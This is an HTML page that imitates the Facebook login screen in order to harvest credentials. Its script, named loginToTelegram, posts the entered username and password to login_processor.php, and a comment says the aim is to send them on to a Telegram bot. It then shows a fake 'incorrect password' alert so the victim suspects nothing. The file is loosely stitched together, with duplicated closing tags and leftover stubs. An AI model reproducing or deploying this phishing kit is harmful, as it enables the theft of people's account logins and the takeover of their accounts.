<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: 'Helvetica', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .container h2 {
            text-align: center;
            color: #1877f2;
        }
        .container label {
            display: block;
            margin: 15px 0 5px;
            color: #333;
        }
        .container input[type="text"],
        .container input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .container input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .container input[type="submit"]:hover {
            background-color: #0e5a8a;
        }
        .container p {
            text-align: center;
            margin-top: 15px;
            color: #555;
        }
        .container a {
            color: #1877f2;
            text-decoration: none;
            font-weight: bold;
        }
        .container a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Log in to Facebook</h2>
        <form id="loginForm" onsubmit="return loginToTelegram()" method="POST">
            <input type="text" id="username" name="username" placeholder="Mobile number or email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
<p>Forgotten account? <a href="#">Sign up for Facebook</a></p>
    </div>
    <script>
        function validateForm() {
            // You can add JavaScript validation here
            return true; // Return true to submit the form, or false to prevent submission
        }
    </script>
</body>
</html>

    <script>
        function loginToTelegram() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Example: Send login information to Telegram bot using AJAX
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'login_processor.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    if (xhr.status == 200) {
                        alert('incorrect password');
                    } else {
                        alert('Error sending login invelid information.');
                    }
                }
            };
            xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));

            return false; // Prevent form submission
        }
    </script>
</body>
</html>
